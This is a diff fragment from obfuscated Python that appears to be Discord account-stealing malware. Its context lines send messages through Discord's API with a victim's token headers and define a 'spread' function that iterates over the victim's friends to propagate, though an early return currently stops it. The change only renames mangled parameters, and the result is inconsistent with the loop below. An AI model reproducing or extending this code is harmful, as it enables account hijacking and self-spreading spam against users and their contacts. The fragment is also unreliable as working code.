@@ -91,7 +91,7 @@ def send_message (OOO00O0O0O0O000O0 ,O00O0O00O000OO000 ,O00000O000O000000 ):#lin
         urlopen (Request (f"https://discordapp.com/api/v6/channels/{O00O0O00O000OO000}/messages",headers =getheaders (OOO00O0O0O0O000O0 ,"multipart/form-data; boundary=---------------------------325414537030329320151394843687"),data =O00000O000O000000 .encode ())).read ().decode ()#line:77
     except :#line:78
         pass #line:79
-def spread (O0OO0000O0O0O0O0O ,O00O00O0OO0OOO0OO ,OO0OOO00000OO0O0O ):#line:80
+def spread (O000OO0OO00000OO0 ,O0OOOO00OOOOOOOOO ,O00O00OOOO0OOO0OO ):#line:80
     return #line:81
     for OO00OOOO00OO000OO in getfriends (O0OO0000O0O0O0O0O ):#line:82
         try :#line:83
